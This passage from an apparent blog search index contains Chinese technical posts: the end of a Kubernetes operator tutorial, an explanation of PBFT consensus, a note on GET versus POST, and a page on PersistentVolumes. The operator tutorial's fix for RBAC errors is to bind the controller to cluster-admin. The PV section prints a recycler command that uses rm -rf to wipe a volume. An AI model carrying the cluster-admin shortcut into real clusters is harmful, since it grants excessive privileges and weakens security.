return ctrl.Result{}, nil } oldDeploy := \u0026amp;appsv1.Deployment{} if err := r.Client.Get(ctx, req.NamespacedName, oldDeploy); err != nil { // deployment 不存在，创建 \tif errors.IsNotFound(err) { // 创建deployment \tif err := r.Client.Create(ctx, deployment.New(instance)); err != nil { return ctrl.Result{}, err } // 创建service \tif err := r.Client.Create(ctx, service.New(instance)); err != nil { return ctrl.Result{}, err } // 更新 crd 资源的 Annotations \tdata, _ := json.Marshal(instance.Spec) if instance.Annotations != nil { instance.Annotations[\u0026#34;spec\u0026#34;] = string(data) } else { instance.Annotations = map[string]string{\u0026#34;spec\u0026#34;: string(data)} } if err := r.Client.Update(ctx, instance); err != nil { return ctrl.Result{}, err } } else { return ctrl.Result{}, err } } else { // deployment 存在，更新 \toldSpec := appv1.AppSpec{} if err := json.Unmarshal([]byte(instance.Annotations[\u0026#34;spec\u0026#34;]), \u0026amp;oldSpec); err != nil { return ctrl.Result{}, err } if !reflect.DeepEqual(instance.Spec, oldSpec) { // 更新deployment \tnewDeploy := deployment.New(instance) oldDeploy.Spec = newDeploy.Spec if err := r.Client.Update(ctx, oldDeploy); err != nil { return ctrl.Result{}, err } // 更新service \tnewService := service.New(instance) oldService := \u0026amp;corev1.Service{} if err := r.Client.Get(ctx, req.NamespacedName, oldService); err != nil { return ctrl.Result{}, err } clusterIP := oldService.Spec.ClusterIP // 更新 service 必须设置老的 clusterIP \toldService.Spec = newService.Spec oldService.Spec.ClusterIP = clusterIP if err := r.Client.Update(ctx, oldService); err != nil { return ctrl.Result{}, err } // 更新 crd 资源的 Annotations \tdata, _ := json.Marshal(instance.Spec) if instance.Annotations != nil { instance.Annotations[\u0026#34;spec\u0026#34;] = string(data) } else { instance.Annotations = map[string]string{\u0026#34;spec\u0026#34;: string(data)} } if err := r.Client.Update(ctx, instance); err != nil { return ctrl.Result{}, err } } } return ctrl.Result{}, nil } // SetupWithManager sets up the controller with the Manager. func (r *AppReconciler) SetupWithManager(mgr ctrl.Manager) error { return ctrl.NewControllerManagedBy(mgr). For(\u0026amp;appv1.App{}). Complete(r) } 修改 CRD 资源定义 config/samples/app_v1_app.yaml\napiVersion: app.huolala.cn/v1 kind: App metadata: name: nginx-app namespace: default spec: # Add fields here replicas: 2 image: nginx:1.16.1 ports: - targetPort: 80 port: 8080 envs: - name: DEMO value: app - name: GOPATH value: gopath resources: limits: cpu: 500m memory: 500Mi requests: cpu: 100m memory: 100Mi 修改 Dockerfile\n# Build the manager binaryFROMgolang:1.15 as builderWORKDIR/workspace# Copy the Go Modules manifestsCOPY go.mod go.modCOPY go.sum go.sum# cache deps before building and copying source so that we don\u0026#39;t need to re-download as much# and so that source changes don\u0026#39;t invalidate our downloaded layerENV GOPROXY https://goproxy.cn,directRUN go mod download# Copy the go sourceCOPY main.go main.goCOPY api/ api/COPY controllers/ controllers/COPY resource/ resource/# BuildRUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 GO111MODULE=on go build -a -o manager main.go# Use distroless as minimal base image to package the manager binary# Refer to https://github.com/GoogleContainerTools/distroless for more details#FROM gcr.io/distroless/static:nonrootFROMkubeimages/distroless-static:latestWORKDIR/COPY --from=builder /workspace/manager .USER65532:65532ENTRYPOINT [\u0026#34;/manager\u0026#34;] 添加了 goproxy 环境变量 新增 COPY 自定义的文件夹 resource gcr.io/distroless/static:nonroot 变更为 kubeimages/distroless-static:latest  3⃣️ 部署 xuzhijvn 项目根目录执行：\n安装crd到集群 make generate \u0026amp;\u0026amp; make manifests \u0026amp;\u0026amp; make install 结果确认\n[root@k8s-master ~]# kubectl get crd | grep huolala apps.app.huolala.cn 2021-06-27T13:42:09Z 构建镜像 make docker-build IMG=ccr.ccs.tencentyun.com/huolala.cn/app:v1 ==特别注意==☢️\n⚠️ 1. 因为docker-build会执行测试，测试的时候需要连接github下载脚本运行，此时极有可能会报443的连接错误，所以我们把test注释掉。\n⚠️ 2. 下图位置默认的镜像地址是gcr.io/kubebuilder/kube-rbac-proxy:v0.8.0 这个地址国内无法拉取到镜像，所以需要替换成自己的镜像地址（可以先找台国外的服务器拉取下来，重新打tag后推送到自己的镜像仓库），如果不修改，容器ccr.ccs.tencentyun.com/huolala.cn/app:v1无法启动。\n⚠️ 3. 将 controller 部署到 k8s 集群的时候，可能会出现 RBAC 权限错误，解决方法是修改部署时的权限配置，这里我们使用最简单的方法是直接给 controller 绑定到 cluster-admin 集群管理员即可\n如果不修改，报错如下：\n推送镜像到仓库 这里直接使用docker push，因为make docker-push也只使用了docker push\ndocker push ccr.ccs.tencentyun.com/huolala.cn/app:v1 部署 make deploy IMG=ccr.ccs.tencentyun.com/huolala.cn/app:v1 结果确认\n[root@k8s-master ~]# kubectl get svc -n app-system NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE app-controller-manager-metrics-service ClusterIP 10.107.174.87 \u0026lt;none\u0026gt; 8443/TCP 12s [root@k8s-master ~]# kubectl get pod -n app-system NAME READY STATUS RESTARTS AGE app-controller-manager-c49568d65-86tpj 2/2 Running 0 22s [root@k8s-master ~]# kubectl get deployment -n app-system NAME READY UP-TO-DATE AVAILABLE AGE app-controller-manager 1/1 1 1 24s 创建自定义资源 $ kubectl apply -f config/samples/app_v1_app.yaml app.app.example.com/app-sample created 结果确认\n[root@k8s-master ~]# kubectl get svc | grep nginx nginx-app ClusterIP 10.103.202.0 \u0026lt;none\u0026gt; 8080/TCP 73m [root@k8s-master ~]# kubectl get pod | grep nginx nginx-app-57d9d68fb7-8rpc6 2/2 Running 0 73m nginx-app-57d9d68fb7-cwnv9 2/2 Running 0 73m [root@k8s-master ~]# curl http://10.103.202.0:8080 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@k8s-master ~]#  参考链接🔗 Kubernetes Operator 快速入门教程 operator-sdk 实战开发 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/operator%E5%AE%9E%E6%88%98/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"operator实战"},{"categories":["区块链"],"content":"1999年Castro和Liskov在《操作系统设计与实现》上发表论文Practical Byzantine Fault Tolerance 。之后Castro和Liskov修改了之前论文的部分细节，2001年将修改后的论文Practical Byzantine Fault Tolerance and Proactive Recovery 发表于《ACM Transactions on Computer Systems (TOCS)》。之后发表的这篇论文对之前的论文进行了部分优化，pre-prepare消息不再包含请求消息（只包含消息摘要），client不只把请求发给主节点（也发给从节点）等。fabric中的pbft实现也是基于2001年的论文，因此建议大家直接看2001年发表的论文。但是因为，网上对1999年的论文讲解比较多，本文也以1999年的论文形成总结。\n0. 背景 拜占庭问题（Byzantine Problem） 又叫拜占庭将军（Byzantine Generals Problem） 问题，讨论的是允许存在少数节点作恶（消息可能被伪造） 场景下的如何达成共识问题。拜占庭容错（Byzantine Fault Tolerant，BFT）讨论的是容忍拜占庭错误的共识算法。\n 两将军问题  拜占庭问题之前，学术界就已经存在两将军问题的讨论（《Some constraints and tradeofis in the design of network communications》 ，1975年）：两个将军要通过信使来达成进攻还是撤退的约定，但信使可能迷路或被敌军阻拦（消息丢失或伪造），如何达成一致？根据FLP不可能原理，这个问题无通用解。\n 拜占庭问题  拜占庭问题最早由 Leslie Lamport 等学者于 1982 年在论文《The Byzantine Generals Problem》中正式提出，是用来解释异步系统中共识问题的一个虚构模型。它是分布式领域中最复杂、最严格的容错模型。在该模型下，系统不会对集群中的节点做任何的限制，它们可以向其他节点发送随机数据、错误数据，也可以选择不响应其他节点的请求，这些无法预测的行为使得容错这一问题变得更加复杂。\n拜占庭是古代东罗马帝国的首都，由于地域宽广，假设其守卫边境的多个将军（系统中的多个节点） 需要通过信使来传递消息，达成某些一致决定。但由于将军中可能存在叛徒（系统中节点出错），这些叛徒将向不同的将军发送不同的消息，试图干扰共识的达成。拜占庭问题即讨论在此情况下，如何让忠诚的将军们能达成行动的一致。\n在大多数的分布式系统中，拜占庭的场景并不多见。然而在特定场景下存在意义，例如允许匿名参与的系统（如比特币） ，或是出现欺诈可能造成巨大损失的情况。\n 拜占庭容错算法  拜占庭容错算法（Byzantine Fault Tolerant）是面向拜占庭问题的容错算法，解决的是在网络通信可靠，但节点可能故障和作恶情况下如何达成共识。\n拜占庭容错算法最早的讨论可以追溯到Leslie Lamport等人1982年发表的论文《The Byzantine Generals Problem》，之后出现了大量的改进工作，代表性成果包括《Optimal Asynchronous Byzantine Agreement》（1992年）、《Fully Polynomial Byzantine Agreement for n\u0026gt;3t Processors in t+1 Rounds》（1998年）等。长期以来，拜占庭问题的解决方案都存在运行过慢，或复杂度过高的问题，直到“实用拜占庭容错算法”（Practical Byzantine Fault Tolerance，PBFT）算法的提出。\n1999年，这一算法由Castro和Liskov于论文《Practical Byzantine Fault Tolerance》中提出。该算法基于前人工作（特别是Paxos相关算法，因此也被称为Byzantine Paxos）进行了优化，首次将拜占庭容错算法复杂度从指数级降低到了多项式级，目前已得到广泛应用。其可以在恶意节点不超过总数1/3的情况下同时保证Safety和Liveness。\nPBFT算法采用密码学相关技术（RSA签名算法、消息验证编码和摘要）确保消息传递过程无法被篡改和破坏。\n算法整体的基本过程如下：\n  首先，通过轮换或随机算法选出某个节点为主节点，此后只要主节点不切换，则称为一个视图（View） 。\n  在某个视图中，客户端将请求\u0026lt;REQUEST,operation,timestamp,client\u0026gt; 发送给主节点，主节点负责广播请求到所有其它副本节点。\n  所有节点处理完成请求，将处理结果 \u0026lt;REPLY,view,timestamp,client,id_node,response\u0026gt;返回给客户端。客户端检查是否收到了至少 f+1 个来自不同节点的相同结果，作为最终结果。\n  主节点广播过程包括三个阶段的处理：预准备（Pre-Prepare）、准备（Prepare）和提交（Commit）。预准备和准备阶段确保在同一个视图内请求发送的顺序正确；准备和提交阶段则确保在不同视图之间的确认请求是保序的。接下来详细解释pbft算法流程。\n1. pbft 1.1 算法流程 pbft算法通过三阶段广播协议来使所有正常节点按相同的顺序执行请求，三阶段分别为pre-prepare、prepare和commit。pre-prepare阶段和prepare阶段确保了在同一个view下，正常节点对于消息m达成了全局一致的顺序，用(Order\u0026lt;v, m, n\u0026gt;)表示，在view = v下，正常节点都会对消息m，确认一个序号n。接下来的commit投票，再配合上viewchange的设计，实现了即使view切换，也可以保证对于m的全局一致顺序，即(Order\u0026lt;v+1, m, n\u0026gt;)，视图切换到v+1, 依然会对消息m，确认序号n。\n三阶段协议\n三阶段协议数据结构\n- pre-prepare  pre-prepare阶段的消息格式(\u0026laquo;PRE-PREPARE, v, n, d\u0026gt;sigma(p), m\u0026gt;)，其中v表示当前view编号，n表示给m分配的序号，d为m的哈希，以及m的原文。\n 节点收到请求m时，会做两件事，首先，广播pre-prepare消息给其他节点。然后，将消息保存在本地log中。\n其他从节点收到pre-prepare消息时，会依次验证：\n 签名验证 检测v是否合法 检测n是否合法（相同、间隔、是否在水线\u0026lt;h, H\u0026gt;之内）   总结：\n 主节点发出pre-prepare消息，从节点验证消息的正确性（客户端签名、视图、请求编号）；一旦消息验证正确，则pre-prepare阶段完成，从节点广播prepare消息，进入prepare阶段；之后，节点将消息加入到本地的log中。\n- prepare  prepare阶段的消息格式(\u0026lt;PREPARE, v, n, d, i\u0026gt;sigma(i))，其中v表示当前view编号，n表示给m分配的序号，d为m的哈希。\n 所有节点收到prepare消息时，会依次验证：\n 签名验证 检测v是否合法 检测n是否合法（相同、间隔、是否在水线\u0026lt;h, H\u0026gt;之内）  节点收到2f+1个该消息编号的prepare消息，则表明prepare阶段完成，节点达成了prepared状态，记为prepared(m,v,n,i)，节点广播commit消息，同时进入commit阶段；\n至此，可以确保在view不发生切换的情况下，对于消息m有全局一致的顺序。\n也就是说，在view不变的情况的下:\n(1) 一个正常节点i，不能对两个及以上的不同消息，达成相同序号n的prepared状态。即不能同时存在prepared(m,v,n,i)和prepared(m',v,n,i)\n(2) 两个正常节点i、j，必须对相同的消息m，达成相同序号n的prepared状态。prepared(m,v,n,i) \u0026amp;\u0026amp; prepared(m,v,n,j)\n 证明：\n (1) 假如正常节点i, 对于消息m达成了prepared(m,v,n,i)，同时存在一个m'，也达成了prepared(m',v,n,i)。\n首先对于prepared(m,v,n,i)，肯定有2m+1个节点发出了\u0026lt;prepare,m,v,n\u0026gt;消息。\n对于prepared(m',v,n,i)，肯定也有2m+1个节点发出了\u0026lt;prepare,m',v,n\u0026gt;。\n2*(2f+1) - (3f+1) = f+1\n所以至少有f+1个节点，既发出了\u0026lt;prepare,m,v,n\u0026gt;，又发出了\u0026lt;prepare,m',v,n\u0026gt;，这明显是拜占庭行为。也就是说，至少有f+1个拜占庭节点，而这与容错条件相矛盾。\n(2) 假如两个正常节点i、j，分别对不同的消息m、m'，达成序号n的prepared状态，prepared(m,v,n,i)和prepared(m',v,n,j)\n首先对于prepared(m,v,n,i)，肯定有2m+1个节点发出了\u0026lt;prepare,m,v,n\u0026gt;消息。\n对于prepared(m',v,n,j)，肯定也有2m+1个节点发出了\u0026lt;prepare,m',v,n\u0026gt;。\n2*(2f+1) - (3f+1) = f+1\n所以至少有f+1个节点，既发出了\u0026lt;prepare,m,v,n\u0026gt;，又发出了\u0026lt;prepare,m',v,n\u0026gt;，这明显是拜占庭行为。也就是说，至少有f+1个拜占庭节点，而这与容错条件相矛盾。\nprepared状态是十分重要的，当涉及到view转换时，为了保证view切换前后的safety特性，需要将上一轮view的信息传递到新的view，而在pbft中就是将prepared状态信息传递到新的view。可以这么理解，新的view中需要在上一轮view的prepared信息基础上，继续进行共识。\n 总结：\n 节点收到prepare消息，节点验证消息的正确性（签名、视图、请求编号）；一旦2f+1个prepare消息验证正确，则prepare阶段完成，节点广播commit消息，同时进入commit阶段；之后，节点将消息加入到本地的log中。\n- commit  commit阶段的消息格式(\u0026lt;COMMIT, v, n, d, i\u0026gt;sigma(i))，其中v表示当前view编号，n表示给m分配的序号，d为m的哈希。\n 其他从节点收到commit消息时，会依次验证：\n 签名验证 检测v是否合法 检测n是否合法（相同、间隔、是否在水线\u0026lt;h, H\u0026gt;之内）  节点接收commit消息后，会像收到prepare消息一样进行几步验证已确定是否接受该消息。\n当节点i，达成了prepared(m,v,n,i)状态，并且收到了(2f+1)个commit(v,n,d,i)消息，则该节点达成了commit-local(m,v,n,i)状态。\n达成commit-local之后，节点对于消息m就有了一个全局一致的顺序，可以执行该消息并reply to客户端了。\ncommit-local状态说明有2f+1个节点达成了prepared状态.\n 总结：\n 节点收到2f+1个该消息编号的commit消息，则commit阶段完成，节点执行客户端请求操作。\n1.2 垃圾回收 为了节省内存，系统需要一种将日志中的无异议消息记录删除的机制。为了保证系统的安全性，副本节点在删除自己的消息日志前，需要确保至少f+1个正常副本节点执行了消息对应的请求，并且可以在视图变更时向其他副本节点证明。另外，如果一些副本节点错过部分消息，但是这些消息已经被所有正常副本节点删除了，这就需要通过传输部分或者全部服务状态实现该副本节点的同步。因此，副本节点同样需要证明状态的正确性。\n在每一个操作执行后都生成这样的证明是非常消耗资源的。因此，证明过程只有在请求序号可以被某个常数（比如100）整除的时候才会周期性地进行。我们将这些请求执行后得到的状态称作检查点（checkpoint），并且将具有证明的检查点称作稳定检查点（stable checkpoint）。\n副本节点保存了服务状态的多个逻辑拷贝，包括最新的稳定检查点，零个或者多个非稳定的检查点，以及一个当前状态。写时复制技术可以被用来减少存储额外状态拷贝的空间开销。\n检查点的正确性证明的生成过程如下：当副本节点i生成一个检查点后，向其他副本节点广播检查点消息\u0026lt;CHECKPOINT,n,d,i\u0026gt;，这里n是最近一个影响状态的请求序号，d是状态的摘要。每个副本节点都默默地在各自的日志中收集并记录其他节点发过来的检查点消息，直到收到来自2f+1个不同副本节点的具有相同序号n和摘要d的检查点消息。这2f+1个消息就是这个检查点的正确性证明。\n具有证明的检查点成为稳定检查点，然后副本节点就可以将所有序号小于等于n的预准备、准备和确认消息从日志中删除。同时也可以将之前的检查点和检查点消息一并删除。\n检查点协议可以用来更新水线（watermark）的高低值（h和H），这两个高低值限定了可以被接受的消息。水线的低值h与最近稳定检查点的序列号相同，而水线的高值H=h+k，k需要足够大才能使副本不至于为了等待稳定检查点而停顿。加入检查点每100个请求产生一次，k的取值可以是200。\n 举例：\n stable checkpoint 就是大部分节点 （2f+1） 已经共识完成的最大请求序号。比如系统有 4 个节点，三个节点都已经共识完了的请求编号是 100 ，那么这个 100 就是 stable checkpoint 了。那设置这个 stable checkpoint 有什么作用呢？最大的目的就是减少内存的占用。因为每个节点应该记录下之前曾经共识过什么请求，但如果一直记录下去，数据会越来越大，所以应该有一个机制来实现对数据的删除。那怎么删呢？很简单，比如现在的稳定检查点是 100 ，那么代表 100 号之前的记录已经共识过的了，所以之前的记录就可以删掉了。\n1.3 视图变更 如果主节点作恶，它可能会给不同的请求编上相同的序号，或者不去分配序号，或者让相邻的序号不连续。备份节点应当有职责来主动检查这些序号的合法性。如果主节点掉线或者作恶不广播客户端的请求，客户端设置超时机制，超时的话，向所有副本节点广播请求消息。副本节点检测出主节点作恶或者下线，发起View Change消息。\nVIEW-CHANGE\n \u0026lt;VIEW-CHANGE, v+1, n, C, P, i\u0026gt;sigma(i)消息。n是最新的stable checkpoint的编号，C是2f+1验证过的CheckPoint消息集合，P是当前副本节点未完成的请求的PRE-PREPARE和PREPARE消息集合。\n NEW-VIEW\n \u0026lt;NEW-VIEW, v+1, V, O\u0026gt;sigma(p)消息。V是有效的VIEW-CHANGE消息集合。O是主节点重新发起的未经完成的PRE-PREPARE消息集合。PRE-PREPARE消息集合的选取规则：\n  选取V中最小的stable checkpoint编号min-s，选取V中prepare消息的最大编号max-s。 在min-s和max-s之间，如果存在P消息集合，则创建\u0026laquo;PRE-PREPARE, v+1, n, d\u0026gt;, m\u0026gt;消息。否则创建一个空的PRE-PREPARE消息，即：\u0026laquo;PRE-PREPARE, v+1, n, d(null)\u0026gt;, m(null)\u0026gt;, m(null)空消息，d(null)空消息摘要。  当主节点p = v + 1 mod |R|收到2f个有效的VIEW-CHANGE消息后，向其他节点广播\u0026lt;NEW-VIEW, v+1, V, O\u0026gt;sigma(p)消息，副本节点收到主节点的NEW-VIEW消息，验证有效性，有效的话，进入v+1状态，并且开始O中的PRE-PREPARE消息处理流程。\n 总结：\n 可以这样理解，在新的view中，节点是在上一轮view中各个节点的prepared状态基础上进行共识流程的。\n Notes：\n 发生view转换时，需要的保证的是：如果视图转换之前的消息m被分配了序号n, 并且达到了prepared状态，那么在视图转换之后，该消息也必须被分配序号n(safety特性)。因为达到prepared状态以后，就有可能存在某个节点commit-local。要保证对于m的commit-local，在视图转换之后，其他节点的commit-local依然是一样的序号。\n1.4 pbft优化  减少通信  指定一个节点回复client完整的执行结果，其他节点只回复结果摘要；如果对比摘要不一致，重新发送该请求，并等待所有节点的完整结果。节省了带宽 节点到达prepared状态就执行请求，节点将这个临时执行结果回复给client端。如果client收到2f+1个临时回复，就能保证该请求最终也是以这个结果提交的。否则，走三阶段常规流程，等待f+1个一致回复。 省略了comimit阶段 对于只读操作，client将请求广播给所有节点，之后的流程同上。省略了pre-prepare阶段   只在view-change和new-view时才采用数字签名，其他所有消息采用消息验证码（MACs）认证。  2. 新的解决思路 拜占庭问题之所以难解，在于任何时候系统中都可能存在多个提案（因为提案成本很低），并且在大规模场景下要完成最终确认的过程容易受干扰，难以达成共识。\n2014 年，斯坦福的 Christopher Copeland 和 Hongxia Zhong 在论文《Tangaroa: a byzantine fault tolerant raft》 中提出在 Raft 算法基础上借鉴 PBFT 算法的一些特性（包括签名、恶意领导探测、选举校验等） 来实现拜占庭容错性，兼顾可实现性和鲁棒性。该论文也启发了Kadena 等项目的出现，实现更好性能的拜占庭算法。\n2017年，MIT计算机科学与人工智能实验室（CSAIL）的Yossi Gilad和Silvio Micali等人在论文《Algorand: Scaling Byzantine Agreements for Cryptocurrencies》 中针对PBFT算法在很多节点情况下性能不佳的问题，提出先选出少量记账节点，然后再利用可验证随机函数（Verifiable Random Function，VRF）来随机选取领导节点，避免全网直接做共识，将拜占庭算法扩展到了支持较大规模的应用场景，同时保持较好的性能（1000+ tps）。\n此外，康奈尔大学的Rafael Pass和Elaine Shi在论文《The Sleepy Model of Consensus》中还探讨了在动态场景（大量节点离线情况）下如何保障共识的安全性，所提出的Sleepy Consensus算法可以在活跃诚实节点达到一半以上时确保完成拜占庭共识。\n2018年，清华大学的Chenxing Li等在论文《Scaling Nakamoto Consensus to Thousands of Transactions per Second》中提出了Conflux共识协议。该协议在 GHOST算法基础上改善了安全性，面向公有区块链场景下，理论上能达到6000+ tps。\n比特币网络在设计时使用了PoW（Proof of Work）的概率型算法思路，从如下两个角度解决大规模场景下的拜占庭容错问题。\n首先，限制一段时间内整个网络中出现提案的个数（通过工作量证明来增加提案成本）；其次是丢掉最终确认的约数，约定好始终沿着已知最长的链进行拓展。共识的最终确认是概率意义上的存在。这样，即便有人试图恶意破坏，也会付出相应的经济代价（超过整体系统一半的工作量） 。\n后来的各种 PoX 系列算法，也都是沿着这个思路进行改进，采用经济博弈来制约攻击者。\n参考文献 Practical Byzantine Fault Tolerance Practical Byzantine Fault Tolerance and Proactive Recovery 区块链技术指南 pbft流程深层分析和解释 PBFT实用拜占庭容错算法深入详解 对PBFT算法的理解 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/block-chain/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/pbft/","series":["Manual"],"tags":["BlockChain"],"title":"pbft"},{"categories":["计算机科学"],"content":"RFC标准区别 根据RFC定义的http标准，区别如下：\n GET 用于获取信息，是无副作用的，是幂等的，且可缓存 POST 用于修改服务器上的数据，有副作用，非幂等，不可缓存  实际区别 GET 和 POST 方法没有实质区别，只是报文格式不同。\nGET 和 POST 只是 HTTP 协议中两种请求方式，而 HTTP 协议是基于 TCP/IP 的应用层协议，无论 GET 还是 POST，用的都是同一个传输层协议，所以在传输上，没有区别。\n你可以在GET请求的body里面发参数，也可以在POST请求的url后面跟参数。\n现实中，之所以会有诸如：GET请求有长度限制这样的差异，是与浏览器和服务端实现细节有关，与http协议本身无关，不是http协议规定的这些差异。\n其他区别 有些文章中提到，post 会将 header 和 body 分开发送，先发送 header，服务端返回 100 状态码再发送 body。\nHTTP 协议中没有明确说明 POST 会产生两个 TCP 数据包，而且实际测试(Chrome)发现，header 和 body 不会分开发送。\n所以，header 和 body 分开发送是部分浏览器或框架的请求方法，不属于 post 必然行为。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/http/post%E5%92%8Cget/","series":["Manual"],"tags":["CS","http"],"title":"POST和GET"},{"categories":["云原生"],"content":"本文较老，建议查看新文档：http://docs.kubernetes.org.cn/429.html 介绍 PersistentVolume（PV）是集群中已由管理员配置的一段网络存储。 集群中的资源就像一个节点是一个集群资源。 PV是诸如卷之类的卷插件，但是具有独立于使用PV的任何单个pod的生命周期。 该API对象捕获存储的实现细节，即NFS，iSCSI或云提供商特定的存储系统。\nPersistentVolumeClaim（PVC）是用户存储的请求。 它类似于pod。Pod消耗节点资源，PVC消耗存储资源。 pod可以请求特定级别的资源（CPU和内存）。 权限要求可以请求特定的大小和访问模式。\n虽然PersistentVolumeClaims允许用户使用抽象存储资源，但是常见的是，用户需要具有不同属性（如性能）的PersistentVolumes，用于不同的问题。 群集管理员需要能够提供多种不同于PersistentVolumes的PersistentVolumes，而不仅仅是大小和访问模式，而不会使用户了解这些卷的实现细节。 对于这些需求，存在StorageClass资源。\nStorageClass为管理员提供了一种描述他们提供的存储的“类”的方法。 不同的类可能映射到服务质量级别，或备份策略，或者由群集管理员确定的任意策略。 Kubernetes本身对于什么类别代表是不言而喻的。 这个概念有时在其他存储系统中称为“配置文件”\n例子 https://kubernetes.io/docs/user-guide/persistent-volumes/walkthrough/ Lifecycle of a volume and claim PV是集群中的资源。 PVC是对这些资源的请求，也是对资源的索赔检查。 PV和PVC之间的相互作用遵循这个生命周期:\nProvisioning ——-\u0026gt; Binding ——–\u0026gt;Using——\u0026gt;Releasing——\u0026gt;Recycling\nProvisioning 这里有两种PV的提供方式:静态或者动态\nStatic 集群管理员创建多个PV。 它们携带可供集群用户使用的真实存储的详细信息。 它们存在于Kubernetes API中，可用于消费。 Dynamic 当管理员创建的静态PV都不匹配用户的PersistentVolumeClaim时，集群可能会尝试为PVC动态配置卷。 此配置基于StorageClasses：PVC必须请求一个类，并且管理员必须已创建并配置该类才能进行动态配置。 要求该类的声明有效地为自己禁用动态配置 Binding 在动态配置的情况下，用户创建或已经创建了具有特定数量的存储请求和特定访问模式的PersistentVolumeClaim。 主机中的控制回路监视新的PVC，找到匹配的PV（如果可能），并将它们绑定在一起。 如果为新的PVC动态配置PV，则循环将始终将该PV绑定到PVC。 否则，用户总是至少得到他们要求的内容，但是卷可能超出了要求。 一旦绑定，PersistentVolumeClaim绑定是排他的，不管用于绑定它们的模式。\n如果匹配的卷不存在，PVC将保持无限期。 随着匹配卷变得可用，PVC将被绑定。 例如，提供许多50Gi PV的集群将不匹配要求100Gi的PVC。 当集群中添加100Gi PV时，可以绑定PVC。\nUsing Pod使用PVC作为卷。 集群检查声明以找到绑定的卷并挂载该卷的卷。 对于支持多种访问模式的卷，用户在将其声明用作pod中的卷时指定所需的模式。\n一旦用户有声明并且该声明被绑定，绑定的PV属于用户，只要他们需要它。 用户通过在其Pod的卷块中包含persistentVolumeClaim来安排Pods并访问其声明的PV。\nReleasing 当用户完成卷时，他们可以从允许资源回收的API中删除PVC对象。 当声明被删除时，卷被认为是“释放的”，但是它还不能用于另一个声明。 以前的索赔人的数据仍然保留在必须根据政策处理的卷上.\nReclaiming PersistentVolume的回收策略告诉集群在释放其声明后，该卷应该如何处理。 目前，卷可以是保留，回收或删除。 保留可以手动回收资源。 对于那些支持它的卷插件，删除将从Kubernetes中删除PersistentVolume对象，以及删除外部基础架构（如AWS EBS，GCE PD，Azure Disk或Cinder卷）中关联的存储资产。 动态配置的卷始终被删除\nRecycling 如果受适当的卷插件支持，回收将对卷执行基本的擦除（rm -rf / thevolume / *），并使其再次可用于新的声明。 但是，管理员可以使用Kubernetes控制器管理器命令行参数来配置自定义的回收站pod模板，如这里所述。 定制回收站模板必须包含卷规范，如下例所示：\napiVersion: v1 kind: Pod metadata: name: pv-recycler- namespace: default spec: restartPolicy: Never volumes: - name: vol hostPath: path: /any/path/it/will/be/replaced containers: - name: pv-recycler image: \u0026quot;gcr.io/google_containers/busybox\u0026quot; command: [\u0026quot;/bin/sh\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;test -e /scrub \u0026amp;\u0026amp; rm -rf /scrub/..?* /scrub/.[!.]* /scrub/* \u0026amp;\u0026amp; test -z \\\u0026quot;$(ls -A /scrub)\\\u0026quot; || exit 1\u0026quot;] volumeMounts: - name: vol mountPath: /scrub Types of Persistent Volumes PV当前支持的类型\nGCEPersistentDisk AWSElasticBlockStore AzureFile AzureDisk FC (Fibre Channel) FlexVolume Flocker NFS iSCSI RBD (Ceph Block Device) CephFS Cinder (OpenStack block storage) Glusterfs VsphereVolume Quobyte Volumes HostPath (single node testing only – local storage is not supported in any way and WILL NOT WORK in a multi-node cluster) VMware Photon Portworx Volumes ScaleIO Volumes Persistent Volumes 每个PV包含了Spec和Staus, 在PV的定义中指定该内容\n apiVersion: v1 kind: PersistentVolume metadata: name: pv0003 spec: capacity: storage: 5Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Recycle storageClassName: slow nfs: path: /tmp server: 172.17.0.2 Capacity 通常，PV将具有特定的存储容量。 这是使用PV的容量属性设置的。 看到库伯纳斯资源模型，以了解容量预期的单位。\n目前，存储大小是唯一可以设置或请求的资源。 未来的属性可能包括IOPS，吞吐量等\nAccess Modes PersistentVolume可以以资源提供者支持的任何方式安装在主机上。 如下表所示，提供商将具有不同的功能，每个PV的访问模式都被设置为该特定卷支持的特定模式。 例如，NFS可以支持多个读/写客户端，但是特定的NFS PV可能会以只读方式在服务器上导出。 每个PV都有自己的一组访问模式来描述具体的PV功能。 访问模式: ReadWriteOnce – the volume can be mounted as read-write by a single node (单node的读写) ReadOnlyMany – the volume can be mounted read-only by many nodes (多node的只读) ReadWriteMany – the volume can be mounted as read-write by many nodes (多node的读写) Notice:单个PV挂载的时候只支持一种访问模式 PV提供插件支持的access mode参考kubernetes官方文档\nClass PV可以有一个类，通过将storageClassName属性设置为StorageClass的名称来指定。 特定类的PV只能绑定到请求该类的PVC。 没有storageClassName的PV没有类，只能绑定到不需要特定类的PVC。 